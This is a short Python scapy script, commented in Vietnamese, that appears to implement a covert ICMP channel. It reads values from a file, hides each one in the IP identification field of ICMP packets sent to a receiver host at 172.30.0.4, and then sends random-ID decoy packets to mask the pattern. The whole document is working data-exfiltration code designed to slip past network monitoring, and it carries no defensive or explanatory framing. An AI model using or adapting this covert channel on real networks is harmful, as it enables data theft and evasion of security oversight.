#!/usr/bin/env python3
from scapy.all import *
import time, random

def send_stealth_packets(dest_ip, ids):
    """Gửi gói ICMP với ID chứa dữ liệu"""
    for id_val in ids:
        send(IP(dst=dest_ip, id=id_val)/ICMP(), verbose=0)
        time.sleep(0.1)
    # Gói nhiễu
    for _ in range(len(ids)):
        send(IP(dst=dest_ip, id=random.randint(0, 65535))/ICMP(), verbose=0)

if __name__ == "__main__":
    with open("ip_ids.txt", "r") as f:
        ids = [int(line.strip()) for line in f]
    send_stealth_packets("172.30.0.4", ids)  # IP receiver
    print(f"[+] Sent {len(ids)} data packets")
